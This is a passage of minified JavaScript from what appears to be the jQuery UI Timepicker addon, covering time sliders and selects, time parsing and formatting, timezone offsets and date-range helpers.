n),this._defaults.microsecMin=this.microsecMinOriginal)):(this._defaults.millisecMin=this.millisecMinOriginal,this._defaults.microsecMin=this.microsecMinOriginal)):(this._defaults.secondMin=this.secondMinOriginal,this._defaults.millisecMin=this.millisecMinOriginal,this._defaults.microsecMin=this.microsecMinOriginal)):(this._defaults.minuteMin=this.minuteMinOriginal,this._defaults.secondMin=this.secondMinOriginal,this._defaults.millisecMin=this.millisecMinOriginal,this._defaults.microsecMin=this.microsecMinOriginal)):(this._defaults.hourMin=this.hourMinOriginal,this._defaults.minuteMin=this.minuteMinOriginal,this._defaults.secondMin=this.secondMinOriginal,this._defaults.millisecMin=this.millisecMinOriginal,this._defaults.microsecMin=this.microsecMinOriginal)}if(null!==$.datepicker._get(dp_inst,"maxDateTime")&&void 0!==$.datepicker._get(dp_inst,"maxDateTime")&&dp_date){var maxDateTime=$.datepicker._get(dp_inst,"maxDateTime"),maxDateTimeDate=new Date(maxDateTime.getFullYear(),maxDateTime.getMonth(),maxDateTime.getDate(),0,0,0,0);null!==this.hourMaxOriginal&&null!==this.minuteMaxOriginal&&null!==this.secondMaxOriginal&&null!==this.millisecMaxOriginal||(this.hourMaxOriginal=o.hourMax,this.minuteMaxOriginal=o.minuteMax,this.secondMaxOriginal=o.secondMax,this.millisecMaxOriginal=o.millisecMax,this.microsecMaxOriginal=o.microsecMax),dp_inst.settings.timeOnly||maxDateTimeDate.getTime()===dp_date.getTime()?(this._defaults.hourMax=maxDateTime.getHours(),this.hour>=this._defaults.hourMax?(this.hour=this._defaults.hourMax,this._defaults.minuteMax=maxDateTime.getMinutes(),this.minute>=this._defaults.minuteMax?(this.minute=this._defaults.minuteMax,this._defaults.secondMax=maxDateTime.getSeconds(),this.second>=this._defaults.secondMax?(this.second=this._defaults.secondMax,this._defaults.millisecMax=maxDateTime.getMilliseconds(),this.millisec>=this._defaults.millisecMax?(this.millisec=this._defaults.millisecMax,this._defaults.microsecMax=maxDateTime.getMicroseconds()):(this.microsec>this._defaults.microsecMax&&(this.microsec=this._defaults.microsecMax),this._defaults.microsecMax=this.microsecMaxOriginal)):(this._defaults.millisecMax=this.millisecMaxOriginal,this._defaults.microsecMax=this.microsecMaxOriginal)):(this._defaults.secondMax=this.secondMaxOriginal,this._defaults.millisecMax=this.millisecMaxOriginal,this._defaults.microsecMax=this.microsecMaxOriginal)):(this._defaults.minuteMax=this.minuteMaxOriginal,this._defaults.secondMax=this.secondMaxOriginal,this._defaults.millisecMax=this.millisecMaxOriginal,this._defaults.microsecMax=this.microsecMaxOriginal)):(this._defaults.hourMax=this.hourMaxOriginal,this._defaults.minuteMax=this.minuteMaxOriginal,this._defaults.secondMax=this.secondMaxOriginal,this._defaults.millisecMax=this.millisecMaxOriginal,this._defaults.microsecMax=this.microsecMaxOriginal)}if(void 0!==adjustSliders&&!0===adjustSliders){var hourMax=parseInt(this._defaults.hourMax-(this._defaults.hourMax-this._defaults.hourMin)%this._defaults.stepHour,10),minMax=parseInt(this._defaults.minuteMax-(this._defaults.minuteMax-this._defaults.minuteMin)%this._defaults.stepMinute,10),secMax=parseInt(this._defaults.secondMax-(this._defaults.secondMax-this._defaults.secondMin)%this._defaults.stepSecond,10),millisecMax=parseInt(this._defaults.millisecMax-(this._defaults.millisecMax-this._defaults.millisecMin)%this._defaults.stepMillisec,10),microsecMax=parseInt(this._defaults.microsecMax-(this._defaults.microsecMax-this._defaults.microsecMin)%this._defaults.stepMicrosec,10);this.hour_slider&&(this.control.options(this,this.hour_slider,"hour",{min:this._defaults.hourMin,max:hourMax}),this.control.value(this,this.hour_slider,"hour",this.hour-this.hour%this._defaults.stepHour)),this.minute_slider&&(this.control.options(this,this.minute_slider,"minute",{min:this._defaults.minuteMin,max:minMax}),this.control.value(this,this.minute_slider,"minute",this.minute-this.minute%this._defaults.stepMinute)),this.second_slider&&(this.control.options(this,this.second_slider,"second",{min:this._defaults.secondMin,max:secMax}),this.control.value(this,this.second_slider,"second",this.second-this.second%this._defaults.stepSecond)),this.millisec_slider&&(this.control.options(this,this.millisec_slider,"millisec",{min:this._defaults.millisecMin,max:millisecMax}),this.control.value(this,this.millisec_slider,"millisec",this.millisec-this.millisec%this._defaults.stepMillisec)),this.microsec_slider&&(this.control.options(this,this.microsec_slider,"microsec",{min:this._defaults.microsecMin,max:microsecMax}),this.control.value(this,this.microsec_slider,"microsec",this.microsec-this.microsec%this._defaults.stepMicrosec))}}},_onTimeChange:function(){if(this._defaults.showTimepicker){var hour=!!this.hour_slider&&this.control.value(this,this.hour_slider,"hour"),minute=!!this.minute_slider&&this.control.value(this,this.minute_slider,"minute"),second=!!this.second_slider&&this.control.value(this,this.second_slider,"second"),millisec=!!this.millisec_slider&&this.control.value(this,this.millisec_slider,"millisec"),microsec=!!this.microsec_slider&&this.control.value(this,this.microsec_slider,"microsec"),timezone=!!this.timezone_select&&this.timezone_select.val(),o=this._defaults,pickerTimeFormat=o.pickerTimeFormat||o.timeFormat,pickerTimeSuffix=o.pickerTimeSuffix||o.timeSuffix;"object"==typeof hour&&(hour=!1),"object"==typeof minute&&(minute=!1),"object"==typeof second&&(second=!1),"object"==typeof millisec&&(millisec=!1),"object"==typeof microsec&&(microsec=!1),"object"==typeof timezone&&(timezone=!1),!1!==hour&&(hour=parseInt(hour,10)),!1!==minute&&(minute=parseInt(minute,10)),!1!==second&&(second=parseInt(second,10)),!1!==millisec&&(millisec=parseInt(millisec,10)),!1!==microsec&&(microsec=parseInt(microsec,10)),!1!==timezone&&(timezone=parseInt(timezone,10));var ampm=o[hour<12?"amNames":"pmNames"][0],hasChanged=hour!==this.hour||minute!==this.minute||second!==this.second||millisec!==this.millisec||microsec!==this.microsec||this.ampm.length>0&&hour<12!=(-1!==$.inArray(this.ampm.toUpperCase(),this.amNames))||null!==this.timezone&&timezone!==this.timezone;hasChanged&&(!1!==hour&&(this.hour=hour),!1!==minute&&(this.minute=minute),!1!==second&&(this.second=second),!1!==millisec&&(this.millisec=millisec),!1!==microsec&&(this.microsec=microsec),!1!==timezone&&(this.timezone=timezone),this.inst||(this.inst=$.datepicker._getInst(this.$input[0])),this._limitMinMaxDateTime(this.inst,!0)),this.support.ampm&&(this.ampm=ampm),this.formattedTime=$.datepicker.formatTime(o.timeFormat,this,o),this.$timeObj&&(pickerTimeFormat===o.timeFormat?this.$timeObj.text(this.formattedTime+pickerTimeSuffix):this.$timeObj.text($.datepicker.formatTime(pickerTimeFormat,this,o)+pickerTimeSuffix)),this.timeDefined=!0,hasChanged&&this._updateDateTime()}},_onSelectHandler:function(){var onSelect=this._defaults.onSelect||this.inst.settings.onSelect,inputEl=this.$input?this.$input[0]:null;onSelect&&inputEl&&onSelect.apply(inputEl,[this.formattedDateTime,this])},_updateDateTime:function(dp_inst){var dtTmp=(dp_inst=this.inst||dp_inst).currentYear>0?new Date(dp_inst.currentYear,dp_inst.currentMonth,dp_inst.currentDay):new Date(dp_inst.selectedYear,dp_inst.selectedMonth,dp_inst.selectedDay),dt=$.datepicker._daylightSavingAdjust(dtTmp),dateFmt=$.datepicker._get(dp_inst,"dateFormat"),formatCfg=$.datepicker._getFormatConfig(dp_inst),timeAvailable=null!==dt&&this.timeDefined;this.formattedDate=$.datepicker.formatDate(dateFmt,null===dt?new Date:dt,formatCfg);var formattedDateTime=this.formattedDate;if(""===dp_inst.lastVal&&(dp_inst.currentYear=dp_inst.selectedYear,dp_inst.currentMonth=dp_inst.selectedMonth,dp_inst.currentDay=dp_inst.selectedDay),!0===this._defaults.timeOnly?formattedDateTime=this.formattedTime:!0!==this._defaults.timeOnly&&(this._defaults.alwaysSetTime||timeAvailable)&&(formattedDateTime+=this._defaults.separator+this.formattedTime+this._defaults.timeSuffix),this.formattedDateTime=formattedDateTime,this._defaults.showTimepicker)if(this.$altInput&&!1===this._defaults.timeOnly&&!0===this._defaults.altFieldTimeOnly)this.$altInput.val(this.formattedTime),this.$input.val(this.formattedDate);else if(this.$altInput){this.$input.val(formattedDateTime);var altFormattedDateTime="",altSeparator=this._defaults.altSeparator?this._defaults.altSeparator:this._defaults.separator,altTimeSuffix=this._defaults.altTimeSuffix?this._defaults.altTimeSuffix:this._defaults.timeSuffix;this._defaults.timeOnly||(altFormattedDateTime=this._defaults.altFormat?$.datepicker.formatDate(this._defaults.altFormat,null===dt?new Date:dt,formatCfg):this.formattedDate)&&(altFormattedDateTime+=altSeparator),this._defaults.altTimeFormat?altFormattedDateTime+=$.datepicker.formatTime(this._defaults.altTimeFormat,this,this._defaults)+altTimeSuffix:altFormattedDateTime+=this.formattedTime+altTimeSuffix,this.$altInput.val(altFormattedDateTime)}else this.$input.val(formattedDateTime);else this.$input.val(this.formattedDate);this.$input.trigger("change")},_onFocus:function(){if(!this.$input.val()&&this._defaults.defaultValue){this.$input.val(this._defaults.defaultValue);var inst=$.datepicker._getInst(this.$input.get(0)),tp_inst=$.datepicker._get(inst,"timepicker");if(tp_inst&&tp_inst._defaults.timeOnly&&inst.input.val()!==inst.lastVal)try{$.datepicker._updateDatepicker(inst)}catch(err){$.timepicker.log(err)}}},_controls:{slider:{create:function(tp_inst,obj,unit,val,min,max,step){var rtl=tp_inst._defaults.isRTL;return obj.prop("slide",null).slider({orientation:"horizontal",value:rtl?-1*val:val,min:rtl?-1*max:min,max:rtl?-1*min:max,step:step,slide:function(event,ui){tp_inst.control.value(tp_inst,$(this),unit,rtl?-1*ui.value:ui.value),tp_inst._onTimeChange()},stop:function(event,ui){tp_inst._onSelectHandler()}})},options:function(tp_inst,obj,unit,opts,val){if(tp_inst._defaults.isRTL){if("string"==typeof opts)return"min"===opts||"max"===opts?void 0!==val?obj.slider(opts,-1*val):Math.abs(obj.slider(opts)):obj.slider(opts);var min=opts.min,max=opts.max;return opts.min=opts.max=null,void 0!==min&&(opts.max=-1*min),void 0!==max&&(opts.min=-1*max),obj.slider(opts)}return"string"==typeof opts&&void 0!==val?obj.slider(opts,val):obj.slider(opts)},value:function(tp_inst,obj,unit,val){return tp_inst._defaults.isRTL?void 0!==val?obj.slider("value",-1*val):Math.abs(obj.slider("value")):void 0!==val?obj.slider("value",val):obj.slider("value")}},select:{create:function(tp_inst,obj,unit,val,min,max,step){for(var sel='<select class="ui-timepicker-select" data-unit="'+unit+'" data-min="'+min+'" data-max="'+max+'" data-step="'+step+'">',format=tp_inst._defaults.pickerTimeFormat||tp_inst._defaults.timeFormat,i=min;i<=max;i+=step)sel+='<option value="'+i+'"'+(i===val?" selected":"")+">",sel+="hour"===unit?$.datepicker.formatTime($.trim(format.replace(/[^ht ]/gi,"")),{hour:i},tp_inst._defaults):"millisec"===unit||"microsec"===unit||i>=10?i:"0"+i.toString(),sel+="</option>";return sel+="</select>",obj.children("select").remove(),$(sel).appendTo(obj).change((function(e){tp_inst._onTimeChange(),tp_inst._onSelectHandler()})),obj},options:function(tp_inst,obj,unit,opts,val){var o={},$t=obj.children("select");if("string"==typeof opts){if(void 0===val)return $t.data(opts);o[opts]=val}else o=opts;return tp_inst.control.create(tp_inst,obj,$t.data("unit"),$t.val(),o.min||$t.data("min"),o.max||$t.data("max"),o.step||$t.data("step"))},value:function(tp_inst,obj,unit,val){var $t=obj.children("select");return void 0!==val?$t.val(val):$t.val()}}}}),$.fn.extend({timepicker:function(o){o=o||{};var tmp_args=Array.prototype.slice.call(arguments);return"object"==typeof o&&(tmp_args[0]=$.extend(o,{timeOnly:!0})),$(this).each((function(){$.fn.datetimepicker.apply($(this),tmp_args)}))},datetimepicker:function(o){var tmp_args=arguments;return"string"==typeof(o=o||{})?"getDate"===o?$.fn.datepicker.apply($(this[0]),tmp_args):this.each((function(){var $t=$(this);$t.datepicker.apply($t,tmp_args)})):this.each((function(){var $t=$(this);$t.datepicker($.timepicker._newInst($t,o)._defaults)}))}}),$.datepicker.parseDateTime=function(dateFormat,timeFormat,dateTimeString,dateSettings,timeSettings){var parseRes=parseDateTimeInternal(dateFormat,timeFormat,dateTimeString,dateSettings,timeSettings);if(parseRes.timeObj){var t=parseRes.timeObj;parseRes.date.setHours(t.hour,t.minute,t.second,t.millisec),parseRes.date.setMicroseconds(t.microsec)}return parseRes.date},$.datepicker.parseTime=function(timeFormat,timeString,options){var o=extendRemove(extendRemove({},$.timepicker._defaults),options||{}),strictParse=(timeFormat.replace(/'.*?'/g,"").indexOf("Z"),function(f,s,o){var treg,regstr="^"+f.toString().replace(/([hH]{1,2}|mm?|ss?|[tT]{1,2}|[zZ]|[lc]|'.*?')/g,(function(match){var amNames,pmNames,markers,ml=match.length;switch(match.charAt(0).toLowerCase()){case"h":case"m":case"s":return 1===ml?"(\\d?\\d)":"(\\d{"+ml+"})";case"l":case"c":return"(\\d?\\d?\\d)";case"z":return"(z|[-+]\\d\\d:?\\d\\d|\\S+)?";case"t":return amNames=o.amNames,pmNames=o.pmNames,markers=[],amNames&&$.merge(markers,amNames),pmNames&&$.merge(markers,pmNames),"("+(markers=$.map(markers,(function(val){return val.replace(/[.*+?|()\[\]{}\\]/g,"\\$&")}))).join("|")+")?";default:return"("+match.replace(/'/g,"").replace(/(\.|\$|\^|\\|\/|\(|\)|\[|\]|\?|\+|\*)/g,(function(m){return"\\"+m}))+")?"}})).replace(/\s/g,"\\s?")+o.timeSuffix+"$",order=function(timeFormat){var finds=timeFormat.toLowerCase().match(/(h{1,2}|m{1,2}|s{1,2}|l{1}|c{1}|t{1,2}|z|'.*?')/g),orders={h:-1,m:-1,s:-1,l:-1,c:-1,t:-1,z:-1};if(finds)for(var i=0;i<finds.length;i++)-1===orders[finds[i].toString().charAt(0)]&&(orders[finds[i].toString().charAt(0)]=i+1);return orders}(f),ampm="",resTime={hour:0,minute:0,second:0,millisec:0,microsec:0};return!!(treg=s.match(new RegExp(regstr,"i")))&&(-1!==order.t&&(void 0===treg[order.t]||0===treg[order.t].length?(ampm="",resTime.ampm=""):(ampm=-1!==$.inArray(treg[order.t].toUpperCase(),o.amNames)?"AM":"PM",resTime.ampm=o["AM"===ampm?"amNames":"pmNames"][0])),-1!==order.h&&("AM"===ampm&&"12"===treg[order.h]?resTime.hour=0:"PM"===ampm&&"12"!==treg[order.h]?resTime.hour=parseInt(treg[order.h],10)+12:resTime.hour=Number(treg[order.h])),-1!==order.m&&(resTime.minute=Number(treg[order.m])),-1!==order.s&&(resTime.second=Number(treg[order.s])),-1!==order.l&&(resTime.millisec=Number(treg[order.l])),-1!==order.c&&(resTime.microsec=Number(treg[order.c])),-1!==order.z&&void 0!==treg[order.z]&&(resTime.timezone=$.timepicker.timezoneOffsetNumber(treg[order.z])),resTime)});return"function"==typeof o.parse?o.parse(timeFormat,timeString,o):"loose"===o.parse?function(f,s,o){try{var d=new Date("2012-01-01 "+s);if(isNaN(d.getTime())&&(d=new Date("2012-01-01T"+s),isNaN(d.getTime())&&(d=new Date("01/01/2012 "+s),isNaN(d.getTime()))))throw"Unable to parse time with native Date: "+s;return{hour:d.getHours(),minute:d.getMinutes(),second:d.getSeconds(),millisec:d.getMilliseconds(),microsec:d.getMicroseconds(),timezone:-1*d.getTimezoneOffset()}}catch(err){try{return strictParse(f,s,o)}catch(err2){$.timepicker.log("Unable to parse \ntimeString: "+s+"\ntimeFormat: "+f)}}return!1}(timeFormat,timeString,o):strictParse(timeFormat,timeString,o)},$.datepicker.formatTime=function(format,time,options){options=options||{},options=$.extend({},$.timepicker._defaults,options),time=$.extend({hour:0,minute:0,second:0,millisec:0,microsec:0,timezone:null},time);var tmptime=format,ampmName=options.amNames[0],hour=parseInt(time.hour,10);return hour>11&&(ampmName=options.pmNames[0]),tmptime=tmptime.replace(/(?:HH?|hh?|mm?|ss?|[tT]{1,2}|[zZ]|[lc]|'.*?')/g,(function(match){switch(match){case"HH":return("0"+hour).slice(-2);case"H":return hour;case"hh":return("0"+convert24to12(hour)).slice(-2);case"h":return convert24to12(hour);case"mm":return("0"+time.minute).slice(-2);case"m":return time.minute;case"ss":return("0"+time.second).slice(-2);case"s":return time.second;case"l":return("00"+time.millisec).slice(-3);case"c":return("00"+time.microsec).slice(-3);case"z":return $.timepicker.timezoneOffsetString(null===time.timezone?options.timezone:time.timezone,!1);case"Z":return $.timepicker.timezoneOffsetString(null===time.timezone?options.timezone:time.timezone,!0);case"T":return ampmName.charAt(0).toUpperCase();case"TT":return ampmName.toUpperCase();case"t":return ampmName.charAt(0).toLowerCase();case"tt":return ampmName.toLowerCase();default:return match.replace(/'/g,"")}}))},$.datepicker._base_selectDate=$.datepicker._selectDate,$.datepicker._selectDate=function(id,dateStr){var inst=this._getInst($(id)[0]),tp_inst=this._get(inst,"timepicker");tp_inst?(tp_inst._limitMinMaxDateTime(inst,!0),inst.inline=inst.stay_open=!0,this._base_selectDate(id,dateStr),inst.inline=inst.stay_open=!1,this._notifyChange(inst),this._updateDatepicker(inst)):this._base_selectDate(id,dateStr)},$.datepicker._base_updateDatepicker=$.datepicker._updateDatepicker,$.datepicker._updateDatepicker=function(inst){var input=inst.input[0];if(!($.datepicker._curInst&&$.datepicker._curInst!==inst&&$.datepicker._datepickerShowing&&$.datepicker._lastInput!==input||"boolean"==typeof inst.stay_open&&!1!==inst.stay_open)){this._base_updateDatepicker(inst);var tp_inst=this._get(inst,"timepicker");tp_inst&&tp_inst._addTimePicker(inst)}},$.datepicker._base_doKeyPress=$.datepicker._doKeyPress,$.datepicker._doKeyPress=function(event){var inst=$.datepicker._getInst(event.target),tp_inst=$.datepicker._get(inst,"timepicker");if(tp_inst&&$.datepicker._get(inst,"constrainInput")){var ampm=tp_inst.support.ampm,tz=null!==tp_inst._defaults.showTimezone?tp_inst._defaults.showTimezone:tp_inst.support.timezone,dateChars=$.datepicker._possibleChars($.datepicker._get(inst,"dateFormat")),datetimeChars=tp_inst._defaults.timeFormat.toString().replace(/[hms]/g,"").replace(/TT/g,ampm?"APM":"").replace(/Tt/g,ampm?"AaPpMm":"").replace(/tT/g,ampm?"AaPpMm":"").replace(/T/g,ampm?"AP":"").replace(/tt/g,ampm?"apm":"").replace(/t/g,ampm?"ap":"")+" "+tp_inst._defaults.separator+tp_inst._defaults.timeSuffix+(tz?tp_inst._defaults.timezoneList.join(""):"")+tp_inst._defaults.amNames.join("")+tp_inst._defaults.pmNames.join("")+dateChars,chr=String.fromCharCode(void 0===event.charCode?event.keyCode:event.charCode);return event.ctrlKey||chr<" "||!dateChars||datetimeChars.indexOf(chr)>-1}return $.datepicker._base_doKeyPress(event)},$.datepicker._base_updateAlternate=$.datepicker._updateAlternate,$.datepicker._updateAlternate=function(inst){var tp_inst=this._get(inst,"timepicker");if(tp_inst){var altField=tp_inst._defaults.altField;if(altField){tp_inst._defaults.altFormat||tp_inst._defaults.dateFormat;var date=this._getDate(inst),formatCfg=$.datepicker._getFormatConfig(inst),altFormattedDateTime="",altSeparator=tp_inst._defaults.altSeparator?tp_inst._defaults.altSeparator:tp_inst._defaults.separator,altTimeSuffix=tp_inst._defaults.altTimeSuffix?tp_inst._defaults.altTimeSuffix:tp_inst._defaults.timeSuffix,altTimeFormat=null!==tp_inst._defaults.altTimeFormat?tp_inst._defaults.altTimeFormat:tp_inst._defaults.timeFormat;altFormattedDateTime+=$.datepicker.formatTime(altTimeFormat,tp_inst,tp_inst._defaults)+altTimeSuffix,tp_inst._defaults.timeOnly||tp_inst._defaults.altFieldTimeOnly||null===date||(altFormattedDateTime=tp_inst._defaults.altFormat?$.datepicker.formatDate(tp_inst._defaults.altFormat,date,formatCfg)+altSeparator+altFormattedDateTime:tp_inst.formattedDate+altSeparator+altFormattedDateTime),$(altField).val(altFormattedDateTime)}}else $.datepicker._base_updateAlternate(inst)},$.datepicker._base_doKeyUp=$.datepicker._doKeyUp,$.datepicker._doKeyUp=function(event){var inst=$.datepicker._getInst(event.target),tp_inst=$.datepicker._get(inst,"timepicker");if(tp_inst&&tp_inst._defaults.timeOnly&&inst.input.val()!==inst.lastVal)try{$.datepicker._updateDatepicker(inst)}catch(err){$.timepicker.log(err)}return $.datepicker._base_doKeyUp(event)},$.datepicker._base_gotoToday=$.datepicker._gotoToday,$.datepicker._gotoToday=function(id){var inst=this._getInst($(id)[0]),$dp=inst.dpDiv;this._base_gotoToday(id);var tp_inst=this._get(inst,"timepicker");selectLocalTimezone(tp_inst);var now=new Date;this._setTime(inst,now),$(".ui-datepicker-today",$dp).click()},$.datepicker._disableTimepickerDatepicker=function(target){var inst=this._getInst(target);if(inst){var tp_inst=this._get(inst,"timepicker");$(target).datepicker("getDate"),tp_inst&&(inst.settings.showTimepicker=!1,tp_inst._defaults.showTimepicker=!1,tp_inst._updateDateTime(inst))}},$.datepicker._enableTimepickerDatepicker=function(target){var inst=this._getInst(target);if(inst){var tp_inst=this._get(inst,"timepicker");$(target).datepicker("getDate"),tp_inst&&(inst.settings.showTimepicker=!0,tp_inst._defaults.showTimepicker=!0,tp_inst._addTimePicker(inst),tp_inst._updateDateTime(inst))}},$.datepicker._setTime=function(inst,date){var tp_inst=this._get(inst,"timepicker");if(tp_inst){var defaults=tp_inst._defaults;tp_inst.hour=date?date.getHours():defaults.hour,tp_inst.minute=date?date.getMinutes():defaults.minute,tp_inst.second=date?date.getSeconds():defaults.second,tp_inst.millisec=date?date.getMilliseconds():defaults.millisec,tp_inst.microsec=date?date.getMicroseconds():defaults.microsec,tp_inst._limitMinMaxDateTime(inst,!0),tp_inst._onTimeChange(),tp_inst._updateDateTime(inst)}},$.datepicker._setTimeDatepicker=function(target,date,withDate){var inst=this._getInst(target);if(inst){var tp_date,tp_inst=this._get(inst,"timepicker");if(tp_inst)this._setDateFromField(inst),date&&("string"==typeof date?(tp_inst._parseTime(date,withDate),(tp_date=new Date).setHours(tp_inst.hour,tp_inst.minute,tp_inst.second,tp_inst.millisec),tp_date.setMicroseconds(tp_inst.microsec)):(tp_date=new Date(date.getTime())).setMicroseconds(date.getMicroseconds()),"Invalid Date"===tp_date.toString()&&(tp_date=void 0),this._setTime(inst,tp_date))}},$.datepicker._base_setDateDatepicker=$.datepicker._setDateDatepicker,$.datepicker._setDateDatepicker=function(target,date){var inst=this._getInst(target);if(inst){"string"==typeof date&&((date=new Date(date)).getTime()||$.timepicker.log("Error creating Date object from string."));var tp_date,tp_inst=this._get(inst,"timepicker");date instanceof Date?(tp_date=new Date(date.getTime())).setMicroseconds(date.getMicroseconds()):tp_date=date,tp_inst&&(tp_inst.support.timezone||null!==tp_inst._defaults.timezone||(tp_inst.timezone=-1*tp_date.getTimezoneOffset()),date=$.timepicker.timezoneAdjust(date,tp_inst.timezone),tp_date=$.timepicker.timezoneAdjust(tp_date,tp_inst.timezone)),this._updateDatepicker(inst),this._base_setDateDatepicker.apply(this,arguments),this._setTimeDatepicker(target,tp_date,!0)}},$.datepicker._base_getDateDatepicker=$.datepicker._getDateDatepicker,$.datepicker._getDateDatepicker=function(target,noDefault){var inst=this._getInst(target);if(inst){var tp_inst=this._get(inst,"timepicker");if(tp_inst){void 0===inst.lastVal&&this._setDateFromField(inst,noDefault);var date=this._getDate(inst);return date&&tp_inst._parseTime($(target).val(),tp_inst.timeOnly)&&(date.setHours(tp_inst.hour,tp_inst.minute,tp_inst.second,tp_inst.millisec),date.setMicroseconds(tp_inst.microsec),null!=tp_inst.timezone&&(tp_inst.support.timezone||null!==tp_inst._defaults.timezone||(tp_inst.timezone=-1*date.getTimezoneOffset()),date=$.timepicker.timezoneAdjust(date,tp_inst.timezone))),date}return this._base_getDateDatepicker(target,noDefault)}},$.datepicker._base_parseDate=$.datepicker.parseDate,$.datepicker.parseDate=function(format,value,settings){var date;try{date=this._base_parseDate(format,value,settings)}catch(err){if(!(err.indexOf(":")>=0))throw err;date=this._base_parseDate(format,value.substring(0,value.length-(err.length-err.indexOf(":")-2)),settings),$.timepicker.log("Error parsing the date string: "+err+"\ndate string = "+value+"\ndate format = "+format)}return date},$.datepicker._base_formatDate=$.datepicker._formatDate,$.datepicker._formatDate=function(inst,day,month,year){var tp_inst=this._get(inst,"timepicker");return tp_inst?(tp_inst._updateDateTime(inst),tp_inst.$input.val()):this._base_formatDate(inst)},$.datepicker._base_optionDatepicker=$.datepicker._optionDatepicker,$.datepicker._optionDatepicker=function(target,name,value){var name_clone,inst=this._getInst(target);if(!inst)return null;var tp_inst=this._get(inst,"timepicker");if(tp_inst){var prop,min=null,max=null,onselect=null,overrides=tp_inst._defaults.evnts,fns={};if("string"==typeof name){if("minDate"===name||"minDateTime"===name)min=value;else if("maxDate"===name||"maxDateTime"===name)max=value;else if("onSelect"===name)onselect=value;else if(overrides.hasOwnProperty(name)){if(void 0===value)return overrides[name];fns[name]=value,name_clone={}}}else if("object"==typeof name)for(prop in name.minDate?min=name.minDate:name.minDateTime?min=name.minDateTime:name.maxDate?max=name.maxDate:name.maxDateTime&&(max=name.maxDateTime),overrides)overrides.hasOwnProperty(prop)&&name[prop]&&(fns[prop]=name[prop]);for(prop in fns)fns.hasOwnProperty(prop)&&(overrides[prop]=fns[prop],name_clone||(name_clone=$.extend({},name)),delete name_clone[prop]);if(name_clone&&isEmptyObject(name_clone))return;min?(min=0===min?new Date:new Date(min),tp_inst._defaults.minDate=min,tp_inst._defaults.minDateTime=min):max?(max=0===max?new Date:new Date(max),tp_inst._defaults.maxDate=max,tp_inst._defaults.maxDateTime=max):onselect&&(tp_inst._defaults.onSelect=onselect)}return void 0===value?this._base_optionDatepicker.call($.datepicker,target,name):this._base_optionDatepicker.call($.datepicker,target,name_clone||name,value)};var isEmptyObject=function(obj){var prop;for(prop in obj)if(obj.hasOwnProperty(prop))return!1;return!0},extendRemove=function(target,props){for(var name in $.extend(target,props),props)null!==props[name]&&void 0!==props[name]||(target[name]=props[name]);return target},detectSupport=function(timeFormat){var tf=timeFormat.replace(/'.*?'/g,"").toLowerCase(),isIn=function(f,t){return-1!==f.indexOf(t)};return{hour:isIn(tf,"h"),minute:isIn(tf,"m"),second:isIn(tf,"s"),millisec:isIn(tf,"l"),microsec:isIn(tf,"c"),timezone:isIn(tf,"z"),ampm:isIn(tf,"t")&&isIn(timeFormat,"h"),iso8601:isIn(timeFormat,"Z")}},convert24to12=function(hour){return 0===(hour%=12)&&(hour=12),String(hour)},computeEffectiveSetting=function(settings,property){return settings&&settings[property]?settings[property]:$.timepicker._defaults[property]},splitDateTime=function(dateTimeString,timeSettings){var separator=computeEffectiveSetting(timeSettings,"separator"),timePartsLen=computeEffectiveSetting(timeSettings,"timeFormat").split(separator).length,allParts=dateTimeString.split(separator),allPartsLen=allParts.length;return allPartsLen>1?{dateString:allParts.splice(0,allPartsLen-timePartsLen).join(separator),timeString:allParts.splice(0,timePartsLen).join(separator)}:{dateString:dateTimeString,timeString:""}},parseDateTimeInternal=function(dateFormat,timeFormat,dateTimeString,dateSettings,timeSettings){var date,parts,parsedTime;if(parts=splitDateTime(dateTimeString,timeSettings),date=$.datepicker._base_parseDate(dateFormat,parts.dateString,dateSettings),""===parts.timeString)return{date:date};if(!(parsedTime=$.datepicker.parseTime(timeFormat,parts.timeString,timeSettings)))throw"Wrong time format";return{date:date,timeObj:parsedTime}},selectLocalTimezone=function(tp_inst,date){if(tp_inst&&tp_inst.timezone_select){var now=date||new Date;tp_inst.timezone_select.val(-now.getTimezoneOffset())}};$.timepicker=new Timepicker,$.timepicker.timezoneOffsetString=function(tzMinutes,iso8601){if(isNaN(tzMinutes)||tzMinutes>840||tzMinutes<-720)return tzMinutes;var minutes=tzMinutes%60,hours=(tzMinutes-minutes)/60,iso=iso8601?":":"",tz=(tzMinutes>=0?"+":"-")+("0"+Math.abs(hours)).slice(-2)+iso+("0"+Math.abs(minutes)).slice(-2);return"+00:00"===tz?"Z":tz},$.timepicker.timezoneOffsetNumber=function(tzString){var normalized=tzString.toString().replace(":","");return"Z"===normalized.toUpperCase()?0:/^(\-|\+)\d{4}$/.test(normalized)?("-"===normalized.substr(0,1)?-1:1)*(60*parseInt(normalized.substr(1,2),10)+parseInt(normalized.substr(3,2),10)):tzString},$.timepicker.timezoneAdjust=function(date,toTimezone){var toTz=$.timepicker.timezoneOffsetNumber(toTimezone);return isNaN(toTz)||date.setMinutes(date.getMinutes()+-date.getTimezoneOffset()-toTz),date},$.timepicker.timeRange=function(startTime,endTime,options){return $.timepicker.handleRange("timepicker",startTime,endTime,options)},$.timepicker.datetimeRange=function(startTime,endTime,options){$.timepicker.handleRange("datetimepicker",startTime,endTime,options)},$.timepicker.dateRange=function(startTime,endTime,options){$.timepicker.handleRange("datepicker",startTime,endTime,options)},$.timepicker.handleRange=function(method,startTime,endTime,options){function checkDates(changed,other){var startdt=startTime[method]("getDate"),enddt=endTime[method]("getDate"),changeddt=changed[method]("getDate");if(null!==startdt){var minDate=new Date(startdt.getTime()),maxDate=new Date(startdt.getTime());minDate.setMilliseconds(minDate.getMilliseconds()+options.minInterval),maxDate.setMilliseconds(maxDate.getMilliseconds()+options.maxInterval),options.minInterval>0&&minDate>enddt?endTime[method]("setDate",minDate):options.maxInterval>0&&maxDate<enddt?endTime[method]("setDate",maxDate):startdt>enddt&&other[method]("setDate",changeddt)}}function selected(changed,other,option){if(changed.val()){var date=changed[method].call(changed,"getDate");null!==date&&options.minInterval>0&&("minDate"===option&&date.setMilliseconds(date.getMilliseconds()+options.minInterval),"maxDate"===option&&date.setMilliseconds(date.getMilliseconds()-options.minInterval)),date.getTime&&other[method].call(other,"option",option,date)}}return 